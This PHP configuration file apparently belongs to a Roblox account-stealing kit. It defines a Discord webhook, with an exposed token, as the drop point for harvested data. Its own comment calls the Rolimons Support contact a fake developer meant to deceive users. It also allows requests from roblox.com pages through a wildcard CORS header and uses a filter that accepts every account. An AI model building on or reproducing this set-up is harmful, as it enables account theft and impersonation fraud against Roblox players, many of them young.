<?php


    $webhook = "https://discordapp.com/api/webhooks/809105957107662878/VVnuyhm1xq3I318M9zuG0tDJ0ehLFA9mfrDmLHBkzSoWtsFSnT95M-r5zmG5ZkntKpv7";
    // fake developer for the bot the users may contact
    $discord_contact = "Rolimons Support#0001";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
       require("status.php");
           header("Access-Control-Allow-Origin: *");
?>